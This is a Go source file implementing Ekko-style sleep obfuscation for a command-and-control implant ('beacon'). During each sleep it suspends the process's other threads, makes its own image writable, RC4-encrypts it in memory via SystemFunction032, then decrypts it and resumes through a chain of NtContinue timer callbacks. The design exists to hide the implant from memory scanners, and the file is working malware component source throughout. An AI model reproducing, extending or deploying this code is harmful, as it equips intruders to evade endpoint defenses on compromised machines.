// Package ekko implements Windows sleep obfuscation for the Go implant,
// restructured so that no Go code and no scheduler P is required between
// the first SuspendThread and the final resume of a sleep cycle.
//
// Per cycle:
//  1. In Go: enumerate peer threads (image start-address filter) and
//     OpenThread each. Nothing is suspended yet, so sysmon preemption,
//     P hand-off and thread creation are all ordinary and safe here.
//  2. Build every step of the cycle into one VirtualAlloc'd block: one
//     CONTEXT per timer, the RC4 key, the UString descriptors. Nothing
//     lives on the goroutine stack, so a stack growth can no longer
//     strand stale pointers into the chain — the suspected cause of the
//     timer-thread crashes reported against the previous Ekko.
//  3. Arm a chain of one-shot timers whose callbacks are all NtContinue:
//     SuspendThread x N, VirtualProtect(image, RW), SystemFunction032
//     (encrypt), NtDelayExecution, SystemFunction032 (decrypt — RC4 is
//     an XOR stream, so the same key restores the plaintext),
//     VirtualProtect(.text, RX), NtResumeProcess, SetEvent.
//  4. The beacon goroutine blocks in WaitForSingleObject for the whole
//     span. Its P is _Psyscall the entire time; sysmon may retake it and
//     hand it to any thread, because no thread needs a P until
//     NtResumeProcess has already restored every suspend count. This
//     removes the confirmed resume-phase P-hand-off deadlock (the
//     sleep-mask hang, mechanism #1) and its suspend-phase variants.
//
// Steps run serially on the timer-queue thread with stepSpacingMs between
// due times. The spacing also gives the kernel ample time to commit each
// suspension, so no per-peer GetThreadContext sync is needed.
//
// There is no watchdog anywhere in this design. The previous Ekko's
// watchdogs could resume peers into an encrypted image (a guaranteed
// crash); here, a stalled chain leaves the beacon waiting and the
// timeout path is the only recovery — see Sleep.
//
// Ordering depends on timer due times: distinct due times on one queue
// fire in order, and a stalled timer thread extends the cycle rather
// than reordering it.
//
// Constraint inherited from the APC design: the implant must be the
// process's main executable (--format exe), since GetModuleHandleA(NULL)
// and the start-address filter both assume it.
package ekko

import (
	"crypto/rand"
	"errors"
	"fmt"
	"runtime"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	pageReadWrite   uintptr = 0x04
	pageExecuteRead uintptr = 0x20

	memCommit  uintptr = 0x1000
	memReserve uintptr = 0x2000
	memRelease uintptr = 0x8000

	// NtQueryInformationThread information classes.
	threadQuerySetWin32StartAddress uintptr = 0x9
	// ThreadSuspendCount: how many ResumeThread calls the thread still
	// needs to run (0 = running).
	threadSuspendCount = 0x23

	// Bounded drain iterations per peer in drainResidualSuspends.
	maxResumeDrain = 8

	// Run every callback on the timer-queue thread itself, serially. All
	// chain contexts share an Rsp derived from one capture taken on that
	// same thread, so this flag is load-bearing.
	wtExecuteInTimerThread = 0x00000020

	// Upper bound on peers per cycle. A beacon process has a handful of
	// Go threads (workers, sysmon, netpoller, template) plus any
	// extension threads; anything beyond this is refused safely (nothing
	// suspended, image untouched).
	maxPeers = 64

	// probeWaitMs bounds the wait for the capture timer that validates
	// timer delivery before anything destructive is armed.
	probeWaitMs = 100

	// stepSpacingMs between chain due times. Comfortably above the
	// microsecond-scale cost of each step, so steps complete in order and
	// each SuspendThread has long committed before the image is mutated.
	stepSpacingMs = 20

	// completionGraceMs added on top of the sleep before the bounded wait
	// gives up on the chain.
	completionGraceMs = 5000

	contextAmd64Size = 1232
)

var (
	kernel32                  = syscall.NewLazyDLL("kernel32.dll")
	procGetModuleHandleA      = kernel32.NewProc("GetModuleHandleA")
	procVirtualAlloc          = kernel32.NewProc("VirtualAlloc")
	procVirtualFree           = kernel32.NewProc("VirtualFree")
	procVirtualProtect        = kernel32.NewProc("VirtualProtect")
	procCreateEventW          = kernel32.NewProc("CreateEventW")
	procSetEvent              = kernel32.NewProc("SetEvent")
	procCreateTimerQueue      = kernel32.NewProc("CreateTimerQueue")
	procCreateTimerQueueTimer = kernel32.NewProc("CreateTimerQueueTimer")
	procDeleteTimerQueueEx    = kernel32.NewProc("DeleteTimerQueueEx")
	procRtlCaptureContext     = kernel32.NewProc("RtlCaptureContext")
	procSuspendThread         = kernel32.NewProc("SuspendThread")
	procResumeThread          = kernel32.NewProc("ResumeThread")

	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
	procNtContinue               = ntdll.NewProc("NtContinue")
	procNtDelayExecution         = ntdll.NewProc("NtDelayExecution")
	procNtResumeProcess          = ntdll.NewProc("NtResumeProcess")
	procNtQueryInformationThread = ntdll.NewProc("NtQueryInformationThread")

	advapi32              = syscall.NewLazyDLL("Advapi32.dll")
	procSystemFunction032 = advapi32.NewProc("SystemFunction032")

	// .text section bounds, resolved once; only .text is restored to RX.
	textSectionBase uintptr
	textSectionSize uintptr
)

// ErrChainTimeout is returned when the chain did not signal completion
// within the sleep time plus the grace period. The peers are resumed by
// the timeout path itself (best-effort NtResumeProcess), so the beacon
// can continue; only this cycle's obfuscation was skipped.
var ErrChainTimeout = errors.New("ekko: chain did not complete within the grace period")

func init() {
	for _, p := range []*syscall.LazyProc{
		procGetModuleHandleA, procVirtualAlloc, procVirtualFree,
		procVirtualProtect, procCreateEventW, procSetEvent,
		procCreateTimerQueue, procCreateTimerQueueTimer, procDeleteTimerQueueEx,
		procRtlCaptureContext, procSuspendThread, procResumeThread,
		procNtContinue, procNtDelayExecution, procNtResumeProcess,
		procNtQueryInformationThread, procSystemFunction032,
	} {
		if err := p.Find(); err != nil {
			panic(fmt.Sprintf("ekko: cannot resolve %s: %v", p.Name, err))
		}
	}

	// NtContinue consumes CONTEXT structs at documented offsets; a layout
	// drift would corrupt state on the timer thread inside the encrypted
	// window instead of failing loudly here.
	if unsafe.Sizeof(CONTEXT{}) != contextAmd64Size {
		panic(fmt.Sprintf("ekko: sizeof(CONTEXT) = %d, expected %d", unsafe.Sizeof(CONTEXT{}), contextAmd64Size))
	}
	var c CONTEXT
	if unsafe.Offsetof(c.Rsp) != 152 || unsafe.Offsetof(c.Rip) != 248 || unsafe.Offsetof(c.FltSave) != 256 {
		panic("ekko: CONTEXT field offsets do not match the amd64 ABI layout")
	}
	var u ustring
	if unsafe.Sizeof(u) != 16 {
		panic(fmt.Sprintf("ekko: sizeof(ustring) = %d, expected 16", unsafe.Sizeof(u)))
	}

	imageBase, _, _ := procGetModuleHandleA.Call(0)
	if imageBase == 0 {
		panic("ekko: GetModuleHandleA returned NULL at init")
	}
	tBase, tSize, err := discoverTextSection(imageBase)
	if err != nil {
		panic(fmt.Sprintf("ekko: %v", err))
	}
	textSectionBase = tBase
	textSectionSize = tSize
}

// discoverTextSection walks the PE section headers to find the .text
// section's runtime bounds.
func discoverTextSection(imageBase uintptr) (base, size uintptr, err error) {
	eLfaNew := *((*uint32)(unsafe.Pointer(imageBase + 0x3c)))
	peHeader := imageBase + uintptr(eLfaNew)

	numSections := *((*uint16)(unsafe.Pointer(peHeader + 4 + 2)))
	sizeOfOptHdr := *((*uint16)(unsafe.Pointer(peHeader + 4 + 16)))

	sectionsStart := peHeader + 4 + 20 + uintptr(sizeOfOptHdr)

	for i := uint16(0); i < numSections; i++ {
		sec := sectionsStart + uintptr(i)*40
		name := (*[8]byte)(unsafe.Pointer(sec))
		if name[0] == '.' && name[1] == 't' && name[2] == 'e' &&
			name[3] == 'x' && name[4] == 't' && name[5] == 0 {
			virtualSize := *((*uint32)(unsafe.Pointer(sec + 8)))
			virtualAddress := *((*uint32)(unsafe.Pointer(sec + 12)))
			return imageBase + uintptr(virtualAddress), uintptr(virtualSize), nil
		}
	}
	return 0, 0, errors.New("ekko: .text section not found in PE headers")
}

// enumeratePeerHandles opens every other image-based thread in the
// process and returns its handle. Start addresses are read here, while
// the process is fully alive — opening handles early is harmless, and
// deferring the suspend itself to the chain is what keeps the Go runtime
// out of the destructive span.
func enumeratePeerHandles(currentTID uint32, imageBase, imageEnd uintptr) ([]windows.Handle, error) {
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(hSnapshot)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	if err := windows.Thread32First(hSnapshot, &te); err != nil {
		return nil, err
	}

	currentPID := uint32(windows.GetCurrentProcessId())
	handles := make([]windows.Handle, 0, 16)

	for {
		if te.OwnerProcessID == currentPID && te.ThreadID != currentTID {
			hThread, openErr := windows.OpenThread(
				windows.THREAD_SUSPEND_RESUME|windows.THREAD_QUERY_INFORMATION,
				false, te.ThreadID,
			)
			if openErr == nil {
				var startAddr, retLen uintptr
				procNtQueryInformationThread.Call(
					uintptr(hThread),
					threadQuerySetWin32StartAddress,
					uintptr(unsafe.Pointer(&startAddr)),
					unsafe.Sizeof(startAddr),
					uintptr(unsafe.Pointer(&retLen)),
				)
				if startAddr >= imageBase && startAddr < imageEnd {
					if len(handles) >= maxPeers {
						windows.CloseHandle(hThread)
						for _, h := range handles {
							windows.CloseHandle(h)
						}
						return nil, fmt.Errorf("ekko: more than %d image-based threads", maxPeers)
					}
					handles = append(handles, hThread)
				} else {
					windows.CloseHandle(hThread)
				}
			}
		}
		if err := windows.Thread32Next(hSnapshot, &te); err != nil {
			break
		}
	}
	return handles, nil
}

// chainState is the fixed part of the VirtualAlloc'd block. Every pointer
// baked into a chain context targets either this block or system memory —
// never a Go stack — so a stack growth in the beacon goroutine between
// arming and completion cannot invalidate the chain.
type chainState struct {
	img     ustring
	key     ustring
	keyBuf  [16]byte
	oldProt uint32
	_pad    uint32
	delayNs int64
}

// chainBlock owns the VirtualAlloc'd block: the fixed chainState followed
// by one CONTEXT per chain step, each 16-byte aligned.
type chainBlock struct {
	addr  uintptr
	steps []CONTEXT
	fixed *chainState
}

func allocChain(stepsN int) (*chainBlock, error) {
	fixedSize := unsafe.Sizeof(chainState{})
	stepsOff := (fixedSize + 15) &^ 15
	total := stepsOff + uintptr(stepsN)*unsafe.Sizeof(CONTEXT{})

	addr, _, _ := procVirtualAlloc.Call(0, total, memCommit|memReserve, pageReadWrite)
	if addr == 0 {
		return nil, errors.New("ekko: VirtualAlloc for the chain block failed")
	}
	b := &chainBlock{
		addr:  addr,
		fixed: (*chainState)(unsafe.Pointer(addr)),
	}
	b.steps = unsafe.Slice((*CONTEXT)(unsafe.Pointer(addr+stepsOff)), stepsN)
	return b, nil
}

func (b *chainBlock) free() {
	if b.addr != 0 {
		procVirtualFree.Call(b.addr, 0, memRelease)
		b.addr = 0
	}
}

// Sleep obfuscates the process image for sleepMs milliseconds.
//
// The beacon goroutine parks in WaitForSingleObject — a plain syscall,
// P in _Psyscall — from before the first suspend until after the final
// resume. If the wait times out, the chain stalled after arming; the
// recovery NtResumeProcess below is safe precisely because this code is
// running at all: .text must be executable (or was never encrypted, if
// the stall preceded the encrypt step), and NtResumeProcess decrements
// each thread's suspend count exactly once, composing with any of Go's
// own outstanding suspend/resume pairs instead of clobbering them.
func Sleep(sleepMs uint64) error {
	if sleepMs == 0 {
		return nil
	}

	// Pin the beacon goroutine for the whole call so currentTID stays
	// valid as the self-exclusion filter for the enumeration below.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	imageBase, _, _ := procGetModuleHandleA.Call(0)
	if imageBase == 0 {
		return errors.New("ekko: GetModuleHandleA returned NULL")
	}
	eLfaNew := *((*uint32)(unsafe.Pointer(imageBase + 0x3c)))
	nt := (*imageNTHeaders64Prefix)(unsafe.Pointer(imageBase + uintptr(eLfaNew)))
	imageSize := uintptr(nt.SizeOfImage)

	currentTID := windows.GetCurrentThreadId()

	hEvent, _, _ := procCreateEventW.Call(0, 0, 0, 0)
	if hEvent == 0 {
		return errors.New("ekko: CreateEventW failed")
	}

	hQueue, _, _ := procCreateTimerQueue.Call()
	if hQueue == 0 {
		windows.CloseHandle(windows.Handle(hEvent))
		return errors.New("ekko: CreateTimerQueue failed")
	}

	// Probe BEFORE enumerating. The 100ms validation window runs while the
	// process is fully alive and nothing is suspended, so any thread
	// created during it is still caught by the enumeration below. The
	// snapshot-to-first-suspend gap — where a brand-new thread would
	// execute the encrypted image — is thereby reduced to the arming time
	// plus one step spacing; this is the residual crash risk of this
	// design (a thread created after the snapshot but before the chain
	// suspends it). A steady-state beacon keeps its thread set stable, so
	// the gap is negligible there; heavy thread churn can hit it.
	var probe CONTEXT
	if err := captureBaseContext(hQueue, hEvent, &probe); err != nil {
		procDeleteTimerQueueEx.Call(hQueue, ^uintptr(0))
		windows.CloseHandle(windows.Handle(hEvent))
		return err
	}

	peers, err := enumeratePeerHandles(currentTID, imageBase, imageBase+imageSize)
	if err != nil {
		procDeleteTimerQueueEx.Call(hQueue, ^uintptr(0))
		windows.CloseHandle(windows.Handle(hEvent))
		return err
	}
	defer func() {
		for _, h := range peers {
			windows.CloseHandle(h)
		}
	}()

	// Defers run LIFO: the timer queue is torn down — waiting out any
	// in-flight callback — before the block it points into is freed, and
	// the event outlives the queue teardown.
	stepsN := len(peers) + 7
	defer windows.CloseHandle(windows.Handle(hEvent))
	block, err := allocChain(stepsN)
	if err != nil {
		return err
	}
	defer block.free()
	defer procDeleteTimerQueueEx.Call(hQueue, ^uintptr(0)) // INVALID_HANDLE_VALUE: wait for callbacks

	steps := buildChain(block, &probe, peers, hEvent, imageBase, imageSize, sleepMs)

	for i := range steps {
		due := uintptr((i + 1) * stepSpacingMs)
		var hNew uintptr
		ret, _, _ := procCreateTimerQueueTimer.Call(
			uintptr(unsafe.Pointer(&hNew)),
			hQueue,
			procNtContinue.Addr(),
			uintptr(unsafe.Pointer(&steps[i])),
			due, 0, wtExecuteInTimerThread,
		)
		if ret == 0 {
			// The first timer is still one spacing out, so no step has
			// run — but resume anyway in case arming somehow straddled
			// it.
			procNtResumeProcess.Call(uintptr(windows.CurrentProcess()))
			drainResidualSuspends(peers)
			return errors.New("ekko: CreateTimerQueueTimer failed")
		}
	}

	// The destructive span. From the runtime's point of view this is one
	// syscall; every scheduling decision the runtime makes in the
	// meantime is safe, because nothing needs a P until NtResumeProcess
	// has already run.
	totalWait := sleepMs + uint64(stepsN)*stepSpacingMs + completionGraceMs
	if totalWait > 0x7FFFFFFF {
		totalWait = 0x7FFFFFFF
	}
	event, _ := windows.WaitForSingleObject(windows.Handle(hEvent), uint32(totalWait))
	if event != windows.WAIT_OBJECT_0 {
		// Timeout: the chain stalled after arming. Force-resume every
		// thread with one call — see the doc comment for why this is
		// always safe from here.
		procNtResumeProcess.Call(uintptr(windows.CurrentProcess()))
	}
	drainResidualSuspends(peers)
	if event == windows.WAIT_OBJECT_0 {
		return nil
	}
	return ErrChainTimeout
}

// drainResidualSuspends resumes any peer still suspended after the
// chain's NtResumeProcess. One NtResumeProcess decrements every thread
// exactly once, so a peer that picked up a second suspend count during
// the span (e.g. Go's async preemption suspending it mid-sleep) would
// otherwise stay suspended for good: the beacon goroutine keeps running
// from its excluded thread while every other thread is frozen. By the
// time this runs, any transient preemptM pair has settled, so a
// positive count is ours to clear. Count-driven and bounded — no
// unconditional drain.
func drainResidualSuspends(peers []windows.Handle) {
	for _, h := range peers {
		for i := 0; i < maxResumeDrain; i++ {
			var count uint32
			var retLen uintptr
			status, _, _ := procNtQueryInformationThread.Call(
				uintptr(h),
				threadSuspendCount,
				uintptr(unsafe.Pointer(&count)),
				unsafe.Sizeof(count),
				uintptr(unsafe.Pointer(&retLen)),
			)
			if status != 0 || count == 0 {
				break
			}
			if r, _, _ := procResumeThread.Call(uintptr(h)); r == ^uintptr(0) {
				break // thread is gone
			}
		}
	}
}

// captureBaseContext queues an immediate RtlCaptureContext callback to
// seed the chain with a live, register-plausible context from the timer
// thread (segment registers, EFlags, MxCsr, and the Rsp the chain steps
// return through). It also proves the timer queue is delivering
// callbacks before anything has been suspended.
func captureBaseContext(hQueue, hEvent uintptr, probe *CONTEXT) error {
	var hNew uintptr
	ret, _, _ := procCreateTimerQueueTimer.Call(
		uintptr(unsafe.Pointer(&hNew)),
		hQueue,
		procRtlCaptureContext.Addr(),
		uintptr(unsafe.Pointer(probe)),
		0, 0, wtExecuteInTimerThread,
	)
	if ret == 0 {
		return errors.New("ekko: capture CreateTimerQueueTimer failed")
	}
	windows.WaitForSingleObject(windows.Handle(hEvent), probeWaitMs)
	if probe.Rip == 0 {
		return errors.New("ekko: timer queue did not deliver the capture callback")
	}
	return nil
}

// buildChain fills the block and returns the step contexts, one per
// timer, in due-time order:
//
//	SuspendThread(peer) x N, VirtualProtect(image, RW), encrypt,
//	NtDelayExecution, decrypt, VirtualProtect(.text, RX),
//	NtResumeProcess, SetEvent.
//
// Each context clones the captured timer-thread context and overrides
// Rip/Rsp/argument registers (Windows x64 ABI). Rsp -= 8 places the
// return slot on the captured stack so that each step's callee returns
// back into the timer dispatch frame, exactly as the previous Ekko
// relied on; steps must therefore keep running on the timer thread
// (wtExecuteInTimerThread).
func buildChain(block *chainBlock, probe *CONTEXT, peers []windows.Handle, hEvent, imageBase, imageSize uintptr, sleepMs uint64) []CONTEXT {
	cs := block.fixed

	cs.img = ustring{
		Length:        uint32(imageSize),
		MaximumLength: uint32(imageSize),
		Buffer:        imageBase,
	}
	cs.key = ustring{
		Length:        uint32(len(cs.keyBuf)),
		MaximumLength: uint32(len(cs.keyBuf)),
		Buffer:        uintptr(unsafe.Pointer(&cs.keyBuf[0])),
	}
	if _, err := rand.Read(cs.keyBuf[:]); err != nil {
		// A failed key read must not degrade silently into a weak key.
		panic("ekko: crypto/rand failed: " + err.Error())
	}
	cs.delayNs = -int64(sleepMs) * 10_000 // 100-ns units, negative = relative

	set := func(c *CONTEXT, rip uintptr, rcx, rdx, r8, r9 uintptr) {
		*c = *probe
		c.Rsp = probe.Rsp - 8
		c.Rip = uint64(rip)
		c.Rcx = uint64(rcx)
		c.Rdx = uint64(rdx)
		c.R8 = uint64(r8)
		c.R9 = uint64(r9)
	}

	i := 0
	for _, h := range peers {
		set(&block.steps[i], procSuspendThread.Addr(), uintptr(h), 0, 0, 0)
		i++
	}
	set(&block.steps[i], procVirtualProtect.Addr(), imageBase, imageSize, pageReadWrite, uintptr(unsafe.Pointer(&cs.oldProt)))
	i++
	set(&block.steps[i], procSystemFunction032.Addr(), uintptr(unsafe.Pointer(&cs.img)), uintptr(unsafe.Pointer(&cs.key)), 0, 0)
	i++
	set(&block.steps[i], procNtDelayExecution.Addr(), 0, uintptr(unsafe.Pointer(&cs.delayNs)), 0, 0)
	i++
	set(&block.steps[i], procSystemFunction032.Addr(), uintptr(unsafe.Pointer(&cs.img)), uintptr(unsafe.Pointer(&cs.key)), 0, 0)
	i++
	set(&block.steps[i], procVirtualProtect.Addr(), textSectionBase, textSectionSize, pageExecuteRead, uintptr(unsafe.Pointer(&cs.oldProt)))
	i++
	set(&block.steps[i], procNtResumeProcess.Addr(), uintptr(windows.CurrentProcess()), 0, 0, 0)
	i++
	set(&block.steps[i], procSetEvent.Addr(), hEvent, 0, 0, 0)
	return block.steps
}
